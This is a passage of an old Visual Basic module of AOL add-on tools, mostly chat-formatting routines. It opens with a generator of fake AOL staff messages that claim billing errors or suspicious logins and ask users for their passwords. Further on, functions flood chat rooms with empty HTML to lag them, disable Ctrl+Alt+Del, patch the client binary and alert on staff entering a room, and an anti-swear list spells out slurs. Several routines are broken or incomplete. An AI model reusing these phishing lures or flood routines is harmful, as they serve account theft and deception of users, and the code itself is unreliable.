If asd = 5 Then das$ = das$ & "I have seen people calling from CANADA using this account. Please verify that you are the correct user by giving me your password. Failure to do so will result in immediate cansellation of this account."
If asd = 6 Then das$ = das$ & "We here at AOL have made a SERIOUS billing error. We have your sign on passoword as 4ry67e, If this is not correct, please respond with the correct password. "
 Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = das$ & "Sorry for this inconvenience. Have a nice day.   :-)"
If asd = 2 Then das$ = das$ & "Thank you and have a nice day using America Online.   :-)"
If asd = 3 Then das$ = das$ & "Thank you and have a nice day.   :-)"
If asd = 4 Then das$ = das$ & "Thank you.   :-)"
If asd = 5 Then das$ = das$ & "Thank you, and enjoy your time on America Online. :-) "
If asd = 6 Then das$ = das$ & "Thank you for your time and cooperation and we hope that you enjoy America Online. :-). "
 
TosPhrase = das$

 
End Function
Sub RenameHost(ByVal aoldir As String, ByVal NewHost As String)
On Error GoTo ErrHandler
'If InStr(AOLDir$, "3") <> 0 Then Version = 3 Else Version = 25
If Len(NewHost$) > 14 Then MsgBox "WTF are you tryin' to do? Mess AOL's software??", 0, "Error": Error 3110
    chat$ = "aolchat.aol"
    PNum = 4761
Open aoldir$ + "\tool\" & chat$ For Binary As #1
Seek #1, PNum
Put #1, , NewHost$
Close #1
Exit Sub
ErrHandler:
MsgBox "Renaming the host was UNSUCCESSFUL.  Please try again.", 0, "Error"
End Sub

Public Sub Disable_Ctrl_Alt_Del()
'Disables the Crtl+Alt+Del
 Dim Ret As Integer
 Dim pOld As Boolean
 Ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, pOld, 0)
End Sub
Public Sub Enable_Ctrl_Alt_Del()
'Enables the Crtl+Alt+Del
 Dim Ret As Integer
 Dim pOld As Boolean
 Ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, pOld, 0)
End Sub
Sub locateMember(SN)
'This will locate a member online. duh
Call keyword("aol://3548:" & SN)
End Sub
Function AOLhwnd() As Integer
'This sets focus on the AOL window
AOL = FindWindow("AOL Frame25", vbNullString)
End Function
Function CLicKEnter(win)
'This will press enter
'Call SendCharNum(win, 13)
End Function
Sub GetMemberProfile(SN)
AppActivate "America  Online"
SendKeys "^g"
Timeout 0.9
prof% = findchildbytitle(AoLMDI(), "Get a Member's Profile")
Timeout 0.7
Edit% = FindChildByClass(prof%, "_AOL_Edit")
Call SendMessageByString(Edit%, WM_SETTEXT, 0, SN)
CLicKEnter (Edit%)
End Sub
Sub FileSearch(File)

Call keyword("File Search")
First% = findchildbytitle(AoLMDI(), "Filesearch")
icon% = FindChildByClass(First%, "_AOL_Icon")
icon% = GetWindow(icon%, 2)

Call ClickIcon(icon%)

Secnd% = findchildbytitle(AoLMDI(), "Software Search")
Edit% = FindChildByClass(Secnd%, "_AOL_Edit")
Call SendMessageByString(Edit%, WM_SETTEXT, 0, File)
Call SendMessageByNum(rich%, WM_CHAR, 0, 13)
End Sub
Sub AOLtextManipulator2(SN, msgg)
room% = AOLFindRoom()
view% = FindChildByClass(room%, "RICHCNTL")
sng$ = CStr(Chr(13) + Chr(10) + SN + ":" + Chr(9) + msgg)
q% = SendMessageByString(view%, WM_SETTEXT, 0, sng$)
DoEvents

End Sub
Sub GuideWatch()
'a good sub but kinda old style
Do
    Y = DoEvents()
For Index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo end_ad
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
X = InStr(LCase$(namez$), LCase$("guide"))
If X <> 0 Then
Call keyword("PC")
MsgBox "A Guide had entered the room."
End If
Next Index%
end_ad:
Loop
End Sub
Sub AOLRunMenuByString(stringer As String)
Call RunMenuByString(AOLWindow(), stringer)
End Sub


Function Mail_ListMail(Box As ListBox)
Box.Clear
AoLMDI
Mailwin = findchildbytitle(AoLMDI, "New Mail")
If Mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
Mailwin = findchildbytitle(AoLMDI, "New Mail")
If Mailwin = 0 Then GoTo Justamin
Timeout (7)
End If

Mailwin = findchildbytitle(AoLMDI, "New Mail")
CountMail
Start:
If Counter = AOLCountMail Then GoTo last
MailTree = FindChildByClass(Mailwin, "_AOL_TREE")
   namelen = SendMessage(MailTree, LB_GETTEXTLEN, Counter, 0)
    Buffer$ = String$(namelen, 0)
    X = SendMessageByString(MailTree, LB_GETTEXT, Counter, Buffer$)
    TabPos = InStr(Buffer$, Chr$(9))
    Buffer$ = Right$(Buffer$, (Len(Buffer$) - (TabPos)))
    Box.AddItem Buffer$
 Timeout (0.001)
Counter = Counter + 1
GoTo Start
last:
End Function

Function Mail_Out_CloseMail()
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = findchildbytitle(A2000%, "Outgoing FlashMail")
End Function

Function Mail_Out_CursorSet(mailIndex As String)
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = findchildbytitle(A2000%, "Outgoing FlashMail")
MailTree% = FindChildByClass(A3000%, "_AOL_Tree")
A6000% = SendMessageByString(MailTree%, LB_SETCURSEL, mailIndex, 0)
End Function
Function Mail_Out_ListMail(Box As ListBox)
Box.Clear
AoLMDI
Mailwin = findchildbytitle(AoLMDI, "New Mail")
If Mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
Mailwin = findchildbytitle(AoLMDI, "New Mail")
If Mailwin = 0 Then GoTo Justamin
Timeout (7)
End If

Mailwin = findchildbytitle(AoLMDI, "Outgoing FlashMail")
CountMail
Start:
If Counter = AOLCountMail Then GoTo last
MailTree = FindChildByClass(Mailwin, "_AOL_TREE")
   namelen = SendMessage(MailTree, LB_GETTEXTLEN, Counter, 0)
    Buffer$ = String$(namelen, 0)
    X = SendMessageByString(MailTree, LB_GETTEXT, Counter, Buffer$)
    TabPos = InStr(Buffer$, Chr$(9))
    Buffer$ = Right$(Buffer$, (Len(Buffer$) - (TabPos)))
    Box.AddItem Buffer$
 Timeout (0.001)
Counter = Counter + 1
GoTo Start
last:
End Function

Function Mail_Out_MailCaption()
End Function

Function Mail_Out_MailCount()
themail% = FindChildByClass(AoLMDI(), "AOL Child")
thetree% = FindChildByClass(themail%, "_AOL_Tree")
Mail_Out_MailCount = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function

Function Mail_Out_PressEnter()
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = findchildbytitle(A2000%, "Outgoing FlashMail")
MailTree% = FindChildByClass(A3000%, "_AOL_Tree")
X = SendMessage(MailTree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(MailTree%, WM_KEYUP, VK_RETURN, 0)
End Function


Function Mail_PressEnter()
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = findchildbytitle(A2000%, "New Mail")
MailTree% = FindChildByClass(A3000%, "_AOL_Tree")
X = SendMessage(MailTree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(MailTree%, WM_KEYUP, VK_RETURN, 0)
End Function



Function Mail_SetCursor(mailIndex As String)
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = findchildbytitle(A2000%, "New Mail")
MailTree% = FindChildByClass(A3000%, "_AOL_Tree")
A6000% = SendMessageByString(MailTree%, LB_SETCURSEL, mailIndex, 0)
End Function
Function FindOpenMail()
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
childfocus% = GetWindow(mdi%, 5)

While childfocus%
listers% = FindChildByClass(childfocus%, "RICHCNTL")
listere% = FindChildByClass(childfocus%, "_AOL_Icon")
listerb% = FindChildByClass(childfocus%, "_AOL_Button")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then FindOpenMail = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend


End Function

Function Mail_MailCaption()
FindOpenMail
Mail_MailCaption = GetCaption(FindOpenMail)
End Function

Function SearchForSelected(lst As ListBox)
If lst.List(0) = "" Then
counterf = 0
GoTo last
End If
counterf = -1

Start:
counterf = counterf + 1
If lst.ListCount = counterf + 1 Then GoTo last
If lst.Selected(counterf) = True Then GoTo last
If couterf = lst.ListCount Then GoTo last
GoTo Start

last:
SearchForSelected = counterf
End Function
Sub AOL4_SetFocus()
X = GetCaption(AOLWindow)
AppActivate X
End Sub
Function AOL4_UpChat()
'this is an upchat that minimizes the
'upload window
die% = FindWindow("_AOL_MODAL", vbNullString)
X = ShowWindow(die%, SW_HIDE)
X = ShowWindow(die%, SW_MINIMIZE)
Call AOL4_SetFocus
End Function
Sub NotOnTop(the As Form)
'This will take a form and make it so that
'it does not stay on top of other forms
'U HAVE TO MAKE THE EXE to SEE IT WERK

SetWinOnTop = SetWindowPos(the.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, flags)
End Sub
Function r_Rainbow(strin2 As String)
Let inptxt2$ = strin2
Let lenth2% = Len(inptxt2$)
mad = """"
dad = "#"

Do While numspc2% <= lenth2%

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & dad & "1d1a62" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & dad & "182a71" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & dad & "094a91" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & dad & "106cac" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & dad & "0d84c4" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & dad & "106cac" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & dad & "094a91" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & dad & "1d1a62" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & dad & "182a71" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & dad & "000000" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$

Loop
BoldSendChat ("<U><I>" & newsent2$)

End Function
Sub Window_ChangeCaption(win, txt)
'This will change the caption of any window that you
'tell it to as long as it is a valid window
text% = SendMessageByString(win, WM_SETTEXT, 0, txt)
End Sub
Sub Chat_Ignore(SN)
room% = AOLFindRoom
List% = FindChildByClass(room%, "_AOL_Listbox")
End Sub
Function ChatLag()
Call SendChat("  <html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>")
End Function

Function ChatLag2()
Call SendChat("  <B><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html> <html></html><html></html><html></html><html></html><html></html><html></html><html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>")
End Function
Function ChatLink(link, txt)
l00A8 = """"
AOLChatLink = "<a href=" & l00A8 & l00A8 & "><a href=" & l00A8 & l00A8 & "><a href=" & l00A8 & link & l00A8 & "><font color=#0000ff><u>" & txt & "<font color=#fffeff></a><a href=" & l00A8 & l00A8 & ">"

End Function
Sub AddRoomToComboBox(ListBox As ListBox, ComboBox As ComboBox)
Call AddRoomToListBox(ListBox)
For q = 0 To ListBox.ListCount
    ComboBox.AddItem (ListBox.List(q))
Next q
End Sub

Sub RollFormsidetoside(frm As Form, STEPS As Integer, finish As Integer)
Do
frm.Width = frm.Width + STEPS
Loop Until frm.Width = finish
End Sub

Sub Wipeout(Lt%, Tp%, frm As Form)

       Dim s, Wx, Hx, i
       s = 90 'number of steps to use in the wipe
       Wx = frm.Width / s 'size of vertical steps
       Hx = frm.Height / s 'size of horizontal steps
       '     ' top and left are static
       '     ' while the width gradually shrinks

              For i = 1 To s - 1
                     frm.Move Lt%, Tp%, frm.Width - Wx
              Next

End Sub
Sub FormDance1(M As Form)

'  This makes a form dance across the screen
M.Left = 5
Timeout (0.1)
M.Left = 400
Timeout (0.1)
M.Left = 700
Timeout (0.1)
M.Left = 1000
Timeout (0.1)
M.Left = 2000
Timeout (0.1)
M.Left = 3000
Timeout (0.1)
M.Left = 4000
Timeout (0.1)
M.Left = 5000
Timeout (0.1)
M.Left = 4000
Timeout (0.1)
M.Left = 3000
Timeout (0.1)
M.Left = 2000
Timeout (0.1)
M.Left = 1000
Timeout (0.1)
M.Left = 700
Timeout (0.1)
M.Left = 400
Timeout (0.1)
M.Left = 5
Timeout (0.1)
M.Left = 400
Timeout (0.1)
M.Left = 700
Timeout (0.1)
M.Left = 1000
Timeout (0.1)
M.Left = 2000

End Sub




Sub StrikeOutSendChat(StrikeOutChat)
'This is a new sub that I thought of. It strikes
'the chat text out.
SendChat ("<S>" & StrikeOutChat & "</S>")
End Sub
Sub Virus()
'This was takin outta nash40.bas
'Thanxz Nash
' Might Want to get rid of that!
Printer.Print "RaVaGe ViRuS KiLL Or Be KiLLed #1"



End Sub
Sub imman(SN As TextBox, SN2 As TextBox, message As TextBox)
Call IMKeyword(SN, Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & "<font size=24><font color=#0000FF><B>" & SN2 & ":   <Font size=38><font color=#000000>" & message)
End Sub
Function wavetalker(strin2, F As ComboBox, c1 As ComboBox, c2 As ComboBox, c3 As ComboBox, c4 As ComboBox)
tixt = F
Color1 = c1
color2 = c2
color3 = c3
Color4 = c4
If Color1 = "Navy" Then Color1 = "000080"
If Color1 = "Maroon" Then Color1 = "800000"
If Color1 = "Lime" Then Color1 = "00FF00"
If Color1 = "Teal" Then Color1 = "008080"
If Color1 = "Red" Then Color1 = "F0000"
If Color1 = "Blue" Then Color1 = "0000FF"
If Color1 = "Siler" Then Color1 = "C0C0C0"
If Color1 = "Yellow" Then Color1 = "FFFF00"
If Color1 = "Aqua" Then Color1 = "00FFFF"
If Color1 = "Purple" Then Color1 = "800080"
If Color1 = "Black" Then Color1 = "000000"

If color2 = "Navy" Then color2 = "000080"
If color2 = "Maroon" Then color2 = "800000"
If color2 = "Lime" Then color2 = "00FF00"
If color2 = "Teal" Then color2 = "008080"
If color2 = "Red" Then color2 = "F0000"
If color2 = "Blue" Then color2 = "0000FF"
If color2 = "Siler" Then color2 = "C0C0C0"
If color2 = "Yellow" Then color2 = "FFFF00"
If color2 = "Aqua" Then color2 = "00FFFF"
If color2 = "Purple" Then color2 = "800080"
If Color1 = "Black" Then color2 = "000000"

If color3 = "Navy" Then color3 = "000080"
If color3 = "Maroon" Then color3 = "800000"
If color3 = "Lime" Then color3 = "00FF00"
If color3 = "Teal" Then color3 = "008080"
If color3 = "Red" Then color3 = "F0000"
If color3 = "Blue" Then color3 = "0000FF"
If color3 = "Siler" Then color3 = "C0C0C0"
If color3 = "Yellow" Then color3 = "FFFF00"
If color3 = "Aqua" Then color3 = "00FFFF"
If color3 = "Purple" Then color3 = "800080"
If Color1 = "Black" Then color3 = "000000"

If Color4 = "Navy" Then Color4 = "000080"
If Color4 = "Maroon" Then Color4 = "800000"
If Color4 = "Lime" Then Color4 = "00FF00"
If Color4 = "Teal" Then Color4 = "008080"
If Color4 = "Red" Then Color4 = "F0000"
If Color4 = "Blue" Then Color4 = "0000FF"
If Color4 = "Siler" Then Color4 = "C0C0C0"
If Color4 = "Yellow" Then Color4 = "FFFF00"
If Color4 = "Aqua" Then Color4 = "00FFFF"
If Color4 = "Purple" Then Color4 = "800080"
If Color1 = "Black" Then Color4 = "000000"

Let inptxt2$ = strin2
Let lenth2% = Len(inptxt2$)
mad = """"
dad = "#"
Do While numspc2% <= lenth2%
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$
Loop
wavytalker = newsent2$
End Function

Sub UnderLineSendChat(UnderLineChat)
' underlines chat text.
SendChat ("<B><u>" & UnderLineChat & "</u>")
End Sub
Sub Antiswearbot(p As Label)
'____________________
'put this in a timer
'soap 1998 (AQuA)
'_____________________
'Thanxz for all the great things
'u been sendin for the bas

If p = LastChatLineWithSN Then GoTo cd
p = LastChatLineWithSN
q = LCase(LastChatLine)
r = SNFromLastChatLine
Dim d As Integer
d = InStr(q, "ass")
If d Then SendChat " - " + r + " please do not swear!!! - "

d = InStr(q, "bitch")
If d Then SendChat " - " + r + " please do not swear!!! - "
  
d = InStr(q, "fuck")
If d Then SendChat " - " + r + " please do not swear!!! - "
  
d = InStr(q, "nigger")
If d Then SendChat " - " + r + " please do not swear!!! - "
  
d = InStr(q, "shit")
If d Then SendChat " - " + r + " please do not swear!!! - "
  
d = InStr(q, "chink")
If d Then SendChat " - " + r + " please do not swear!!! - "
  
d = InStr(q, "faggot")
If d Then SendChat " - " + r + " please do not swear!!! - "
  
d = InStr(q, "butt")
If d Then SendChat " - " + r + " please do not swear!!! - "
  
d = InStr(q, "slut")
If d Then SendChat " - " + r + " please do not swear!!! - "
  
d = InStr(q, "whore")
If d Then SendChat " - " + r + " please do not swear!!! - "
  
d = InStr(q, "dick")
If d Then SendChat " - " + r + " please do not swear!!! - "
  
d = InStr(q, "penis")
If d Then SendChat " - " + r + " please do not swear!!! - "
  
d = InStr(q, "vagina")
If d Then SendChat " - " + r + " please do not swear!!! - "
  
d = InStr(q, "lamer")
If d Then SendChat " - " + r + " please do not swear!!! - "
 
d = InStr(q, "pussy")
If d Then SendChat " - " + r + " please do not swear!!! - "
 
d = InStr(q, "fag")
If d Then SendChat " - " + r + " please do not swear!!! - "
 
d = InStr(q, "mean")
If d Then SendChat " - " + r + " please do not swear!!! - "
 
d = InStr(q, "steve case")
If d Then SendChat " - " + r + " please do not swear!!! - "
 
d = InStr(q, "anal")
If d Then SendChat " - " + r + " please do not swear!!! - "
 
d = InStr(q, "cum")
If d Then SendChat " - " + r + " please do not swear!!! - "
 
d = InStr(q, "porno")
If d Then SendChat " - " + r + " please do not swear!!! - "
 
d = InStr(q, "nigga")
If d Then SendChat " - " + r + " please do not swear!!! - "
cd:
End Sub


Sub ItalicSendChat(ItalicChat)
'Makes chat text in Italics.
SendChat ("<i>" & ItalicChat & "</i>")
End Sub
Sub BoldSendChat(BoldChat)
'This is new it makes the chat text bold.
'example:
'BoldSendChat ("ThIs Is BoLd")
'It will come out bold on the chat screen.
SendChat ("<b>" & BoldChat & "</b>")
End Sub
Sub BoldWavyChatBlueBlack(TheText)
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<B><FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#F0" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next W
BoldSendChat (p$)
End Sub
Function BoldAOL4_WavColors2(Text1 As String)
G$ = Text1
a = Len(G$)
For W = 1 To a Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & ">" & T$
Next W
BoldSendChat (p$)
End Function
Sub BoldWavyColorbluegree(TheText)
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & "></b>" & T$
Next W
BoldSendChat (p$)
End Sub
Function BoldWavyColorredandblack(TheText)

G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & "></b>" & T$
Next W
BoldWavyColorredandblack (p$)
End Function
Function BoldWavyColorredandblue(TheText)
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "></b>" & T$
Next W
BoldWavyColorredandblack (p$)
End Function

Sub EliteTalker(word$)
Made$ = ""
For q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If letter$ = "b" Then Leet$ = "b"
    If letter$ = "c" Then Leet$ = "ç"
    If letter$ = "d" Then Leet$ = "d"
    If letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If letter$ = "j" Then Leet$ = ",j"
    If letter$ = "n" Then Leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If letter$ = "s" Then Leet$ = "š"
    If letter$ = "t" Then Leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If letter$ = "w" Then Leet$ = "vv"
    If letter$ = "y" Then Leet$ = "ÿ"
    If letter$ = "0" Then Leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If letter$ = "B" Then Leet$ = "ß"
    If letter$ = "C" Then Leet$ = "Ç"
    If letter$ = "D" Then Leet$ = "Ð"
    If letter$ = "E" Then Leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If letter$ = "N" Then Leet$ = "Ñ"
    If letter$ = "O" Then Leet$ = "Õ"
    If letter$ = "S" Then Leet$ = "Š"
    If letter$ = "U" Then Leet$ = "Û"
    If letter$ = "W" Then Leet$ = "VV"
    If letter$ = "Y" Then Leet$ = "Ý"
    If letter$ = "`" Then Leet$ = "´"
    If letter$ = "!" Then Leet$ = "¡"
    If letter$ = "?" Then Leet$ = "¿"
    If Len(Leet$) = 0 Then Leet$ = letter$
    Made$ = Made$ & Leet$
Next q
BoldSendChat (Made$)
End Sub

Sub IMsOn()
Call IMKeyword("$IM_ON", "RaVaGe Ownz U ")
End Sub
Sub IMsOff()
Call IMKeyword("$IM_OFF", "RaVaGe ownz u ")
End Sub






Sub Attention(TheText As String)

BoldSendChat ("$$$$$$$ ATTENTION $$$$$$$$")
Call Timeout(0.15)
BoldSendChat (TheText)
Call Timeout(0.15)
BoldSendChat ("$$$$$$$ ATTENTION $$$$$$$$")
Call Timeout(0.15)
'BoldSendChat ("<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & "‹›·´¯`·._.·• " & G$ & "v¹·¹" & L$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • " & aa$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • ")
End Sub

Sub KillGlyph()
' Kills the annoying spinning AOL logo in the toobar
' on AOL 4.0
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
Glyph% = FindChildByClass(AOTool2%, "_AOL_Glyph")
Call SendMessage(Glyph%, WM_CLOSE, 0, 0)
End Sub

Sub unKillGlyph()

For GetIcon = 1 To 19
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon
End Sub



Function TrimTime()
b$ = Left$(Time$, 5)
HourH$ = Left$(b$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime = HourH$ & Right$(b$, 3) & " " & Ap$
End Function
Function TrimTime2()
b$ = Time$
HourH$ = Left$(b$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime2 = HourH$ & ":" & Right$(b$, 5) & " " & Ap$
End Function

Function EliteText(word$)
Made$ = ""
For q = 1 To Len(word$)
    letter$ = ""
